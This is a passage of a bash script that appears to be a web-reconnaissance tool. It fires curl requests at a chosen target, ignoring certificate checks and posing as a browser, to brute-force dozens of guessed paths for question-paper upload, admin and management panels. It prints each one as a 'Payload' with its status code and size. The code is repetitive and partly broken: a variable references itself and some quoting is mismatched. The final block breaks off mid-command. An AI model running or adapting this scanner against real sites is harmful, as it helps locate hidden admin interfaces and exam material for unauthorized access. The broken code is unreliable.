echo -n "Payload ["ExamPaper-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
